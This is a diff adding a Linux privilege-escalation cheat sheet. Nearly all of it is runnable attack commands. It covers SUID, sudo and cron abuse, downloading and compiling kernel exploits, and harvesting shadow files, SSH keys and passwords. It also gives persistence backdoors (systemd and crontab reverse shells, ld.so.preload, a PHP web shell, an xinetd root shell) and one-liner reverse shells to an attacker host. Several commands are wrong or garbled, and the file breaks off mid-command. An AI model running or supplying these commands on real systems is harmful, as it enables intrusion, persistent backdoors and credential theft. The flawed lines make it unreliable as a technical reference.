@@ -1,0 +1,1123 @@
+whoami
+id
+uname -a
+hostname
+cat /etc/os-release
+
+cat /etc/passwd
+cat /etc/group
+sudo -l
+
+find / -perm -4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+ps aux
+ps -ef
+
+netstat -tulnp
+ss -tulnp
+ip a
+
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+env
+
+ls -la /home
+ls -la /root
+
+cat ~/.bash_history
+
+uname -r
+
+ls -la /tmp
+ls -la /var/tmp
+
+find / -type f -name "*.bak" 2>/dev/null
+find / -type f -name "*.old" 2>/dev/null
+
+================================================================================
+                    LINUX PRIVILEGE ESCALATION - COMPLETE CODE COLLECTION
+================================================================================
+
+TABLE OF CONTENTS:
+1. System Enumeration
+2. User & Group Enumeration
+3. Network Enumeration
+4. Process Enumeration
+5. File System Enumeration
+6. SUID/SGID Exploitation
+7. Sudo Exploitation
+8. Cron Job Exploitation
+9. Kernel Exploits
+10. Password Mining
+11. PATH Hijacking
+12. Capabilities Abuse
+13. NFS Exploitation
+14. Docker Escape
+15. Persistence Methods
+16. Automated Tools
+17. One-Liner Reverse Shells
+18. Privilege Escalation Cheat Sheet
+
+================================================================================
+1. SYSTEM ENUMERATION
+================================================================================
+
+# OS Information
+cat /etc/*-release
+cat /etc/issue
+lsb_release -a
+hostnamectl
+
+# Kernel Information
+uname -a
+uname -r
+uname -m
+cat /proc/version
+dmesg | grep Linux
+
+# Environment Variables
+env
+set
+echo $PATH
+echo $HOME
+echo $SHELL
+
+# System Architecture
+lscpu
+cat /proc/cpuinfo
+cat /proc/meminfo
+
+# Mounted File Systems
+mount
+df -h
+cat /etc/fstab
+lsblk
+
+# Hardware Information
+lspci
+lsusb
+lshw -short
+
+================================================================================
+2. USER & GROUP ENUMERATION
+================================================================================
+
+# Current User Info
+whoami
+id
+id <username>
+groups
+groups <username>
+logname
+who
+w
+last
+lastlog
+
+# All Users
+cat /etc/passwd
+cat /etc/passwd | cut -d: -f1
+getent passwd
+ls /home/
+
+# Password File (if readable)
+cat /etc/shadow 2>/dev/null
+cat /etc/shadow | grep -v '*\|!'
+
+# Group Information
+cat /etc/group
+getent group
+groups root
+
+# Sudo Privileges
+sudo -l
+sudo -ll
+cat /etc/sudoers
+cat /etc/sudoers.d/* 2>/dev/null
+
+# User History
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+cat ~/.psql_history
+cat ~/.nano_history
+cat ~/.python_history
+history
+
+# Scheduled Tasks (User Level)
+crontab -l
+crontab -l -u root
+
+================================================================================
+3. NETWORK ENUMERATION
+================================================================================
+
+# Network Interfaces
+ifconfig -a
+ip addr show
+ip link show
+cat /etc/network/interfaces
+cat /etc/netplan/*.yaml
+
+# Routing Table
+route -n
+ip route show
+netstat -rn
+
+# Active Connections
+netstat -antup
+netstat -tulpn
+ss -tunlp
+ss -antp
+lsof -i
+lsof -i :80
+
+# ARP Table
+arp -a
+ip neigh show
+
+# DNS Configuration
+cat /etc/resolv.conf
+dig
+nslookup
+
+# Hosts File
+cat /etc/hosts
+
+# Network Services
+systemctl list-units --type=service --state=running
+service --status-all
+
+# Firewall Rules
+iptables -L -n
+iptables -t nat -L -n
+ufw status
+nft list ruleset
+
+# Listening Ports
+netstat -lnp
+ss -lnp
+lsof -i -P -n | grep LISTEN
+
+# Network Statistics
+netstat -s
+ss -s
+
+# TCP Wrappers
+cat /etc/hosts.allow
+cat /etc/hosts.deny
+
+================================================================================
+4. PROCESS ENUMERATION
+================================================================================
+
+# All Processes
+ps aux
+ps -ef
+ps auxf  # Tree view
+top -b -n 1
+htop
+
+# Root Processes
+ps aux | grep root
+ps -U root -u root
+
+# Process by User
+ps -u <username>
+
+# Process Tree
+pstree -a
+pstree -p
+
+# Specific Process Info
+cat /proc/$$/status
+cat /proc/$$/environ | tr '\0' '\n'
+ls -la /proc/$$/fd/
+
+# Services
+systemctl list-units --type=service
+systemctl list-unit-files | grep enabled
+chkconfig --list
+
+# Running Processes with Capabilities
+ps -e -o pid,cmd,cap
+
+# Process Monitoring (real-time)
+watch -n 1 'ps aux --sort=-%cpu | head -20'
+
+================================================================================
+5. FILE SYSTEM ENUMERATION
+================================================================================
+
+# SUID Binaries
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -04000 -type f 2>/dev/null
+
+# SGID Binaries
+find / -perm -g=s -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# World-Writable Files
+find / -perm -222 -type f 2>/dev/null
+find / -perm -o+w -type f 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+# World-Writable Directories
+find / -perm -o+w -type d 2>/dev/null
+find / -writable -type d 2>/dev/null
+
+# Files with Capabilities
+getcap -r / 2>/dev/null
+
+# Sensitive Files
+find / -name "*.conf" -type f 2>/dev/null
+find / -name "*.cfg" -type f 2>/dev/null
+find / -name "config.*" -type f 2>/dev/null
+find / -name "*.key" -type f 2>/dev/null
+find / -name "*.pem" -type f 2>/dev/null
+find / -name "*.crt" -type f 2>/dev/null
+find / -name "id_rsa" -type f 2>/dev/null
+find / -name "authorized_keys" -type f 2>/dev/null
+
+# SSH Keys
+ls -la /home/*/.ssh/
+ls -la /root/.ssh/
+find / -name "*.pub" 2>/dev/null
+
+# Backup Files
+find / -name "*.bak" -type f 2>/dev/null
+find / -name "*.backup" -type f 2>/dev/null
+find / -name "*.old" -type f 2>/dev/null
+find / -name "*.sql" -type f 2>/dev/null
+
+# Recently Modified Files
+find / -type f -mtime -1 2>/dev/null
+find / -type f -mmin -30 2>/dev/null
+
+# Large Files (for data exfiltration)
+find / -type f -size +100M 2>/dev/null
+
+# Hidden Files
+find / -name ".*" -type f 2>/dev/null
+ls -la ~/
+ls -la /tmp/
+ls -la /var/tmp/
+
+# Web Files
+find /var/www -type f 2>/dev/null
+ls -la /var/www/html/
+cat /var/www/html/config.php
+
+# Log Files
+ls -la /var/log/
+tail -f /var/log/auth.log
+tail -f /var/log/syslog
+tail -f /var/log/messages
+journalctl -xe
+
+================================================================================
+6. SUID/SGID EXPLOITATION
+================================================================================
+
+# FIND SUID BINARIES
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 2>/dev/null
+
+# EXPLOIT COMMON SUID BINARIES
+
+# Find Binary
+find /tmp -exec sh -p \; -quit
+find /tmp -exec /bin/bash -p \; -quit
+
+# Bash Binary
+bash -p
+/bin/bash -p
+
+# Vim/Nano
+vim -c ':!/bin/sh'
+nano -c ':!/bin/sh'
+
+# Python
+python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Perl
+perl -e 'setuid(0); system("/bin/sh")'
+
+# Ruby
+ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+
+# PHP
+php -r 'posix_setuid(0); system("/bin/sh");'
+
+# Awk
+awk 'BEGIN {system("/bin/sh")}'
+
+# CP/MV - Overwrite /etc/passwd
+cp /bin/bash /tmp/bash
+chmod u+s /tmp/bash
+mv /etc/passwd /etc/passwd.bak
+echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# Base64 - Read files
+base64 /etc/shadow
+cat /etc/shadow | base64 -d
+
+# Tar
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# Socat
+socat EXEC:"/bin/sh",pty,stderr,setsid,sigint,sane TCP:attacker:4444
+
+# Node
+node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
+
+# OpenSSL
+openssl enc -d -base64 -in /etc/shadow
+
+================================================================================
+7. SUDO EXPLOITATION
+================================================================================
+
+# CHECK SUDO PERMISSIONS
+sudo -l
+sudo -ll
+
+# EXPLOIT COMMON SUDO RULES
+
+# Full sudo access
+sudo su
+sudo -i
+sudo /bin/bash
+sudo /bin/sh
+
+# NOPASSWD: ALL
+sudo /bin/bash
+
+# Vim
+sudo vim -c ':!/bin/sh'
+sudo vim -c ':!bash'
+
+# Find
+sudo find /tmp -exec /bin/sh \; -quit
+
+# Awk
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+# Python
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Perl
+sudo perl -e 'exec "/bin/sh";'
+
+# Ruby
+sudo ruby -e 'exec "/bin/sh"'
+
+# Less/More
+sudo less /etc/passwd
+# Within less: !/bin/sh
+
+# Man
+sudo man man
+# Within man: !/bin/bash
+
+# Nano
+sudo nano
+# Within nano: Ctrl+R, Ctrl+X, then: reset; bash -i >&2
+
+# Apache2
+sudo apache2 -f /etc/shadow
+
+# Apt
+sudo apt update
+sudo apt install -f /dev/stdin
+# Or create custom package
+
+# Chown/Chmod (change ownership of /etc/passwd)
+sudo chown $(whoami) /etc/passwd
+echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# CP/MV (copy /etc/shadow)
+sudo cp /etc/shadow /tmp/shadow
+cat /tmp/shadow
+
+# Mount (bind mount /etc)
+sudo mount --bind /tmp /etc
+echo "root:password" | chpasswd
+
+# Systemctl
+sudo systemctl start shell.service
+# Create custom service:
+cat > /tmp/shell.service << EOF
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+sudo systemctl link /tmp/shell.service
+sudo systemctl start shell.service
+
+# GDB
+sudo gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit
+
+# Ftp
+sudo ftp
+# Within ftp: !/bin/bash
+
+# Git
+sudo git help config
+# Within help: !/bin/bash
+
+# Node
+sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
+
+# Docker (if in docker group)
+docker run -v /:/mnt -it alpine chroot /mnt bash
+
+================================================================================
+8. CRON JOB EXPLOITATION
+================================================================================
+
+# FIND CRON JOBS
+cat /etc/crontab
+ls -la /etc/cron*
+ls -la /var/spool/cron/
+ls -la /var/spool/cron/crontabs/
+cat /etc/anacrontab
+crontab -l
+crontab -l -u root
+
+# WILDCARD INJECTION (tar/rsync)
+
+# In directory where cron runs:
+touch --checkpoint=1
+touch --checkpoint-action=exec=/bin/sh
+
+# For rsync:
+touch ./shell.sh
+chmod +x ./shell.sh
+touch -- '--rsh=./shell.sh'
+
+# WRITABLE CRON SCRIPT
+echo '#!/bin/bash' > /etc/cron.hourly/backup.sh
+echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /etc/cron.hourly/backup.sh
+chmod +x /etc/cron.hourly/backup.sh
+
+# PATH HIJACKING IN CRON
+export PATH=/tmp:$PATH
+echo '/bin/bash' > /tmp/ls
+chmod +x /tmp/ls
+
+# CREATE MALICIOUS DEB PACKAGE
+cat > malicious.sh << EOF
+#!/bin/bash
+chmod u+s /bin/bash
+EOF
+
+mkdir -p malicious/DEBIAN
+cat > malicious/DEBIAN/control << EOF
+Package: malicious
+Version: 1.0
+Maintainer: attacker
+Architecture: all
+Description: malicious package
+EOF
+
+cat > malicious/DEBIAN/postinst << EOF
+#!/bin/bash
+chmod u+s /bin/bash
+EOF
+chmod +x malicious/DEBIAN/postinst
+dpkg-deb --build malicious
+
+# Exploit logrotate (if cron runs it)
+# Create a malicious log file with SSH key
+echo "ssh-rsa AAAAB3... root@kali" > /var/log/auth.log
+# Logrotate will copy it to root's .ssh directory
+
+================================================================================
+9. KERNEL EXPLOITS
+================================================================================
+
+# CHECK KERNEL VERSION
+uname -a
+uname -r
+cat /proc/version
+
+# LINUX EXPLOIT SUGGESTER
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+# DIRTY COW (CVE-2016-5195)
+wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
+gcc -pthread dirtyc0w.c -o dirtyc0w
+./dirtyc0w /etc/passwd "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash"
+
+# DIRTY PIPE (CVE-2022-0847)
+wget https://raw.githubusercontent.com/imfiver/CVE-2022-0847/main/Dirty-Pipe.sh
+chmod +x Dirty-Pipe.sh
+./Dirty-Pipe.sh
+
+# COWROOT (CVE-2017-1000112)
+wget https://www.exploit-db.com/raw/43418 -O cowroot.c
+gcc cowroot.c -o cowroot -pthread
+./cowroot
+
+# OVERLAYFS (CVE-2021-3493)
+wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+gcc exploit.c -o exploit
+./exploit
+
+# PWNKIT (CVE-2021-4034)
+wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/pwnkit.c
+gcc pwnkit.c -o pwnkit
+./pwnkit
+
+# POLKIT (CVE-2021-3560)
+git clone https://github.com/Almorabea/Polkit-exploit
+cd Polkit-exploit
+./exploit
+
+================================================================================
+10. PASSWORD MINING
+================================================================================
+
+# GREP FOR PASSWORDS
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
+grep -r "password" /etc/* 2>/dev/null
+grep -r "passwd" /var/www/ 2>/dev/null
+
+# COMMON CONFIG FILES
+cat /etc/ssl/private/*.key
+cat /etc/ssh/ssh_host_*_key
+cat /home/*/.my.cnf
+cat /home/*/.pgpass
+cat /var/www/html/wp-config.php
+cat /var/www/html/config.php
+cat /var/www/html/.env
+cat /var/www/html/settings.php
+cat /var/www/html/configuration.php
+
+# HISTORY FILES
+cat ~/.bash_history | grep -E "(pass|key|token|secret)"
+cat ~/.zsh_history | grep -E "(pass|key|token|secret)"
+cat ~/.mysql_history
+cat ~/.psql_history
+cat ~/.python_history
+cat ~/.node_history
+cat ~/.redis_history
+
+# SSH KEYS (Readable)
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa
+cat ~/.ssh/authorized_keys
+
+# KERBEROS
+cat /etc/krb5.keytab
+klist
+
+# CREDENTIAL CACHES
+ls -la /tmp | grep cred
+ls -la /var/tmp | grep cred
+
+# PAM CONFIGURATION
+cat /etc/pam.d/common-password
+cat /etc/pam.d/system-auth
+
+# SHADOW FILE (if readable)
+cat /etc/shadow
+cat /etc/shadow | grep -v '*\|!'
+
+# CRACK HASHES
+# Save hash to file: root:$6$salt$hash:0:0:root:/root:/bin/bash
+john hash.txt
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+
+# MEMORY DUMPING
+cat /proc/$$/mem
+gdb -p <PID>
+(gdb) dump memory /tmp/dump 0x00600000 0x006fffff
+strings /tmp/dump | grep -i password
+
+================================================================================
+11. PATH HIJACKING
+================================================================================
+
+# CHECK CURRENT PATH
+echo $PATH
+
+# FIND WRITABLE DIRECTORIES IN PATH
+find $(echo $PATH | tr ':' ' ') -type d -writable 2>/dev/null
+
+# HIJACKING EXAMPLE
+# If a script runs "ls" without full path:
+cd /tmp
+echo '/bin/bash' > ls
+chmod +x ls
+export PATH=/tmp:$PATH
+# Wait for privileged script to run
+
+# CREATE MALICIOUS COMMAND
+cat > /tmp/ps << EOF
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x /tmp/ps
+export PATH=/tmp:$PATH
+
+# PERSISTENT HIJACKING
+echo 'export PATH=/tmp:$PATH' >> ~/.bashrc
+
+================================================================================
+12. CAPABILITIES ABUSE
+================================================================================
+
+# FIND FILES WITH CAPABILITIES
+getcap -r / 2>/dev/null
+capsh --print
+
+# DANGEROUS CAPABILITIES
+
+# cap_setuid+ep
+./binary -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# cap_dac_read_search (read any file)
+./binary /etc/shadow
+
+# cap_sys_admin (mount filesystems)
+mkdir /tmp/mount
+mount -t cifs //127.0.0.1/share /tmp/mount
+
+# cap_sys_ptrace (debug processes)
+gdb -p <root_pid>
+(gdb) call (void)system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
+
+# cap_net_raw (sniff traffic)
+tcpdump -i eth0 -w capture.pcap
+
+# cap_sys_module (load kernel module)
+cat > exploit.c << EOF
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+static int __init exploit_init(void) {
+    char *argv[] = { "/bin/bash", NULL };
+    char *envp[] = { "HOME=/root", NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    return 0;
+}
+
+module_init(exploit_init);
+MODULE_LICENSE("GPL");
+EOF
+
+make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+insmod exploit.ko
+
+================================================================================
+13. NFS EXPLOITATION
+================================================================================
+
+# CHECK NFS EXPORTS
+showmount -e <target_ip>
+rpcinfo -p <target_ip>
+nmap -p 111,2049 <target_ip>
+
+# MOUNT NFS SHARE
+mkdir /tmp/nfs_mount
+mount -t nfs <target_ip>:/shared /tmp/nfs_mount -o nolock
+mount -o rw,no_root_squash <target_ip>:/shared /tmp/nfs_mount
+
+# EXPLOIT no_root_squash
+cd /tmp/nfs_mount
+cp /bin/bash .
+chmod u+s bash
+# On target:
+/tmp/nfs_mount/bash -p
+
+# CREATE SUID BINARY ON NFS SHARE
+cat > shell.c << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+EOF
+
+gcc shell.c -o shell
+chmod u+s shell
+# Execute on target:
+./shell
+
+================================================================================
+14. DOCKER ESCAPE
+================================================================================
+
+# CHECK DOCKER GROUP
+id | grep docker
+
+# ESCAPE VIA DOCKER SOCKET
+docker run -v /:/mnt -it alpine chroot /mnt bash
+docker run -it -v /:/host alpine chroot /host bash
+
+# DOCKER PRIVILEGED CONTAINER
+docker run --privileged -it alpine
+# Inside container:
+mkdir /tmp/mount
+mount /dev/sda1 /tmp/mount
+chroot /tmp/mount bash
+
+# DOCKER WITH HOST NETWORK
+docker run --net=host -it alpine
+# Access host services on localhost
+
+# CGROUP RELEASE_AGENT ESCAPE
+cat > /tmp/escape.sh << EOF
+#!/bin/bash
+chmod u+s /bin/bash
+EOF
+chmod +x /tmp/escape.sh
+
+echo "#!/bin/sh" > /tmp/cmd
+echo "/tmp/escape.sh" >> /tmp/cmd
+chmod +x /tmp/cmd
+
+docker run --rm -v /tmp:/tmp --privileged alpine /tmp/cmd
+
+================================================================================
+15. PERSISTENCE METHODS
+================================================================================
+
+# SSH KEY BACKDOOR
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+
+# SUID BACKDOOR
+cp /bin/bash /tmp/backdoor
+chmod u+s /tmp/backdoor
+/tmp/backdoor -p
+
+# CRON PERSISTENCE
+echo "* * * * * root nc -e /bin/bash <attacker_ip> 4444" >> /etc/crontab
+echo "@reboot root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/crontab
+
+# SYSTEMD SERVICE
+cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=Backdoor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable backdoor.service
+systemctl start backdoor.service
+
+# CREATE ROOT USER
+useradd -m -s /bin/bash backdoor
+echo 'backdoor:password123' | chpasswd
+usermod -aG sudo backdoor
+usermod -aG root backdoor
+
+# .BASHRC BACKDOOR
+echo 'nc -e /bin/bash <attacker_ip> 4444 &' >> /root/.bashrc
+echo 'alias sudo="sudo " && nc -e /bin/bash <attacker_ip> 4444 &' >> /root/.bashrc
+
+# WRITABLE /ETC/LD.SO.PRELOAD
+echo "/tmp/backdoor.so" > /etc/ld.so.preload
+# Create malicious library:
+cat > backdoor.c << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+EOF
+gcc -shared -o /tmp/backdoor.so -fPIC backdoor.c
+
+# WEB SHELL
+echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
+
+# XINETD BACKDOOR
+cat > /etc/xinetd.d/backdoor << EOF
+service backdoor
+{
+    disable = no
+    type = UNLISTED
+    socket_type = stream
+    protocol = tcp
+    wait = no
+    user = root
+    bind = 0.0.0.0
+    port = 31337
+    server = /bin/bash
+    server_args = -i
+    flags = NODELAY
+}
+EOF
+service xinetd restart
+
+================================================================================
+16. AUTOMATED TOOLS
+================================================================================
+
+# LINPEAS
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+./linpeas.sh -a  # All checks
+./linpeas.sh -s  # Superfast
+
+# LINEUM
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+# LINUX SMART ENUMERATION
+wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+chmod +x lse.sh
+./lse.sh -l2  # Level 2 (recommended)
+./lse.sh -l1  # Stealthy
+
+# LINUX EXPLOIT SUGGESTER
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+# PSPY (Process Monitor)
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+chmod +x pspy64
+./pspy64
+./pspy64 -pf -i 1000  # Full output every second
+
+# TRAWLER (for backups, configs, databases)
+wget https://github.com/jakewarren/trawler/raw/master/trawler
+chmod +x trawler
+./trawler
+
+# SUID3NUM (SUID enumeration)
+wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
+python3 suid3num.py
+
+# LES (Linux Enumeration Script)
+wget https://raw.githubusercontent.com/m0nad/LES/master/LES.sh
+chmod +x LES.sh
+./LES.sh
+
+================================================================================
+17. ONE-LINER REVERSE SHELLS
+================================================================================
+
+# BASH
+bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
+exec 5<>/dev/tcp/<attacker_ip>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# NC (Netcat)
+nc -e /bin/bash <attacker_ip> 4444
+nc -e /bin/sh <attacker_ip> 4444
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
+
+# PYTHON
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+# PHP
+php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# PERL
+perl -e 'use Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# RUBY
+ruby -rsocket -e 'c=TCPSocket.new("<attacker_ip>","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# TELNET
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | telnet <attacker_ip> 4444 > /tmp/f
+
+# SOCAT
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:4444
+
+# NODE
+node -e 'require("child_process").spawn("/bin/bash", {stdio: ["tcp","tcp","tcp"], socket: require("net").connect(4444,"<attacker_ip>")})'
+
+# JAVA
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker_ip>/4444;cat <&5|while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+# UPGRADE TO FULL TTY
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+script /dev/null -c bash
+# After getting shell:
+stty raw -echo
+fg
+export TERM=xterm
+
+================================================================================
+18. PRIVILEGE ESCALATION CHEAT SHEET
+================================================================================
+
+# QUICK CHECKLIST
+# 1. System Information
+uname -a && cat /etc/*-release
+
+# 2. User Context
+id && whoami && sudo -l
+
+# 3. SUID Binaries
+find / -perm -4000 2>/dev/null
+
+# 4. Writable Files
+find / -writable -type f 2>/dev/null
+
+# 5. Cron Jobs
+cat /etc/crontab 2>/dev/null && ls -la /etc/cron* 2>/dev/null
+
+# 6. Processes
+ps aux | grep root
+
+# 7. Network
+netstat -antup && ifconfig -a
+
+# 8. History
+cat ~/.bash_history | grep -E "(pass|key|token|secret)"
+
+# 9. Config Files
+find / -name "*.conf" -type f 2>/dev/null | xargs grep -i "password" 2>/dev/null
+
+# 10. Run Automated
+./linpeas.sh
+
+# COMMON EXPLOIT PATHS
+
+# SUID FIND
+find / -perm -u=s -type f 2>/dev/null | grep find
+# If find has SUID:
+find /tmp -exec /bin/sh \; -quit
+
+# SUDO WITHOUT PASSWORD
+sudo -l | grep NOPASSWD
+# If any binary listed, check GTFOBins
+
+# WRITABLE /ETC/PASSWD
+ls -la /etc/passwd
+# If writable:
+openssl passwd -1 -salt abc password
+echo "root2:\$1\$abc\$8R4H6h6J4ZJ2YJ2YJ2YJ2.:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# CRON WITH WILDCARD
+ls -la /etc/cron* | grep tar
+# If tar runs with *:
+touch --checkpoint=1
+touch --checkpoint-action=exec=/bin/sh
+
+# DOCKER GROUP
+id | grep docker
+# If in docker group:
+docker run -v /:/mnt -it alpine chroot /mnt bash
+
+# NFS NO_ROOT_SQUASH
+showmount -e localhost
+# If no_root_squash present:
+mount -o rw,no_root_squash localhost:/shared /tmp/nfs
+cp /bin/bash /tmp/nfs/shell
+chmod u+s /tmp/nfs/shell
+/tmp/nfs/shell -p
+
+# KERNEL EXPLOIT
+uname -r
+# Use linux-exploit-suggester to find matching exploit
+
+# PASSWORD REUSE
+cat /home/*/.bash_history | grep ssh
+cat /home/*/.ssh/id_rsa
+# Try passwords found in history for root
+
+# CREDENTIALS IN ENVIRONMENT
+env | grep -i pass
+cat /proc/self/environ | tr '\0' '\n' | grep -i pass
+
+# LOG FILES WITH PASSWORDS
+grep -i "password" /var/log/* 2>/dev/null
+grep -i "password" /var/log/auth.log 2>/dev/null
+
+# WEB CONFIG FILES
+find /var/www -name "*.php" -exec grep -i "password" {} \; 2>/dev/null
+find /var/www -name "*.env" -exec cat {} \; 2>/dev/null
+find /var/www -name "wp-config.php" -exec cat {} \; 2>/dev/null
+
+================================================================================
+19. ADDITIONAL USEFUL COMMANDS
+================================================================================
+
+# FILE TRANSFER
+# Python HTTP Server (on attacker)
+python3 -m http.server 8000
+# Download on target
+wget http://attacker:8000/linpeas.sh
+curl http://attacker:8000/linpeas.sh -o linpeas.sh
+
+# SCP Transfer
+scp linpeas.sh user@target:/tmp/
+
+# Netcat Transfer (on attacker)
+nc -lvnp 4444 < linpeas.sh
+# On target
+nc attacker 4444 > linpeas.sh
+
+# Base64 Transfer
+base64 -w0 linpeas.sh
+# Copy output and decode on target
+echo "base64_string" | base64 -d > linpeas.sh
+
+# SSH Tunneling
+# Local Port Forward
+ssh -L 8080:localhost:80 user@target
+# Remote Port Forward
+ssh -R 8080:localhost:80 user@target
+
+# Chisel Tunneling
+# On attacker
+./chisel server -p 8000 --reverse
+# On target
+./chisel client attacker:8000 R:8080:127.0.0.1:80
+
+# LinPEAS Color Output
+./linpeas.sh | tee linpeas_output.txt
+./linpeas.sh -a | tee linpeas_full.txt
+
+# Search for specific binaries
+which nc python python3 perl ruby php gcc g++ make
+
+# Check if GCC is installed
+command -v g
+
